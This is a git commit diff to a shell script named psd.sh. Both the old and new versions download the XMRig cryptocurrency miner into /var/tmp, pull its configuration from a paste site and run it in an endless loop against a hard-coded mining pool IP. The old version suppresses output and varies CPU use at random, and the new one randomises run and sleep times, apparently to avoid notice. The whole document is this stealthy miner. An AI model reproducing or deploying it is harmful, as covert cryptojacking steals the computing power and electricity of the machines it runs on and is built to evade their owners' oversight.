bc3f152320c26ea52fdc3eb9a5423638e234ffd0
Thuwarakan <mothuwarakan@gmail.com>
2022-09-04 08:28:44 +0530

    Update psd.sh

--- psd.sh
+++ psd.sh
@@ -1,22 +1,12 @@
-#!/bin/bash
-curl -o /var/tmp/xmrig -L https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-static-x64.tar.gz > /dev/null 2>&1
-curl -o /var/tmp/config.json http://hastebin.com/afulikenov.json  > /dev/null 2>&1
-chmod 777 /var/tmp/xmrig 
-cd /var/tmp 
+#!/bin/sh
+curl -o /var/tmp/xmrig -L https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
+curl -o /var/tmp/config.json https://pastebin.com/raw/[id]
+chmod 777 /var/tmp/xmrig
+cd /var/tmp
 tar -xvf xmrig
-cp xmrig-6.14.0/xmrig xmrig
-t_min=45
-t_max=120
-cpu_min=5
-cpu_max=40
-chmod 777 xmrig
+cp xmrig-6.14.0/xmrig ./xmrig
 while true :
   do
-    t=$(($t_min + $RANDOM % ($t_max - $t_min)))
-    cpu=$(($cpu_max + $t * ($cpu_min - $cpu_max)/($t_max - $t_min)))
-    echo $cpu
-    cat config.json |jq -r --arg cpu "$cpu" '."max-cpu-usage"=$cpu' > u.json
-    mv u.json config.json 
-    timeout $t xmrig -o 20.169.8.123:3333 > /dev/null 2>&1
-    sleep $t
+    timeout $(($(($RANDOM%(3600-600+1)))+600)) ./xmrig -o 20.169.8.123:3333
+    sleep $(($(($RANDOM%(5000-600+1)))+600))
 done
